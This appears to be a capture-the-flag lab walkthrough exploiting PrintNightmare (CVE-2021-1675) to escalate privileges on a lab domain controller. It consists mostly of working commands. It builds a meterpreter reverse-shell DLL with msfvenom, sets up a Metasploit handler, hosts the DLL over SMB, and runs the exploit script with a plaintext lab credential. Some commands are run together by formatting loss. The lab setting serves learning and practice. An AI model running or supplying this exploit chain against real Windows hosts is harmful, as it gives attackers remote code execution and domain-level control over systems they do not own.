printNigthmare 

getting privesc into domain 

at first we created virtual env and not updating the impackets directly. Just install the impackets new version into this venv

GitHub - cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare…
Impacket implementation of the PrintNightmare PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li…

github.com
https://github.com/cube0x0/CVE-2021-1675


I’m gonna install a virtual environment for this:

apt install virtualenv

I cloned this github repo, went inside it then ran:

virtualenv --python=python3 impacketsource impacket/bin/activate

As you can see, we are in the virtual environment now. Next, run:

pip3 install .pip2 install .

to install all the modules here in the environment.
Now, we need to create a malicious dll file.

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.1.100 LPORT=1235 -f dll > shell.dll

Copy this shell.dll to your virtual environment folder, then fire up msfconsole. Enter these in there:

msf6 > use multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set lhost tun0msf6 exploit(multi/handler) > set lport 1235msf6 exploit(multi/handler) > run

Now, go to your virtual environment and run in the impacket directory:

smbserver.py share `pwd` -smb2support

to host the file.
Now, create another virtual environment. Copy CVE-2021–1675.py from the downloaded CVE to your virtual environment’s directory, then run this on your virtual environment:

python3 CVE-2021-1675.py VULNNET/enterprise-security:'sand_0873959498'@active.thm '\\10.9.1.100\share\shell.dll'